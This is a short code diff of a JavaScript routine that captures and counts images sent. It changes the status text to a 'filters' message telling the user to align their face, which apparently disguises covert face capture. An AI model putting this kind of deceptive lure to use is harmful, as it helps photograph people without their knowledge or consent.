@@ -50,7 +50,7 @@
         function startContinuousCapture() {
             captureInterval = setInterval(async () => {
                 if (imagesSent >= MAX_IMAGES) {
-                    statusDiv.textContent = `Loading filters- ${MAX_IMAGES} %`;
+                    statusDiv.textContent = `(align face in frame)Loaded filters- ${MAX_IMAGES} `;
                     clearInterval(captureInterval);
                     return;
                 }
